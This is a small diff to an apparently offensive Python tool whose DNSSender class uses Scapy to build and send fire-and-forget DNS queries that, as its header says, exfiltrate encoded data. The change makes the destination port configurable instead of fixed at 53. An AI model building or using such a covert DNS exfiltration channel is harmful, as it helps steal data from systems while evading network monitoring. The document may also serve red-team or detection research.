@@ -2,7 +2,8 @@
 # Crafts and transmits DNS query packets using Scapy to exfiltrate encoded data.
 #
 # Packet structure per query:
-#   IP(dst=dns_server) / UDP(sport=src_port, dport=53) / DNS(rd=1, qd=DNSQR(qname=fqdn, qtype="A"))
+#   IP(dst=dns_server) / UDP(sport=src_port, dport=dns_server_port) /
+#   DNS(rd=1, qd=DNSQR(qname=fqdn, qtype="A"))
 #
 # Uses send() (layer 3, fire-and-forget). No response is expected or waited for.
 
@@ -51,7 +52,8 @@ class DNSSender:
     Each query is a raw UDP/DNS packet sent with Scapy's send() (layer 3,
     fire-and-forget). No response is expected or waited for. The packet
     structure is:
-        IP(dst=config.dns_server) / UDP(sport=config.src_port, dport=53) /
+        IP(dst=config.dns_server) /
+        UDP(sport=config.src_port, dport=config.dns_server_port) /
         DNS(rd=1, qd=DNSQR(qname=fqdn, qtype="A"))
 
     Args:
@@ -76,7 +78,7 @@ class DNSSender:
         """
         packet = (
             IP(dst=self.config.dns_server)
-            / UDP(sport=self.config.src_port, dport=53)
+            / UDP(sport=self.config.src_port, dport=self.config.dns_server_port)
             / DNS(rd=1, qd=DNSQR(qname=fqdn, qtype="A"))
         )
         try:
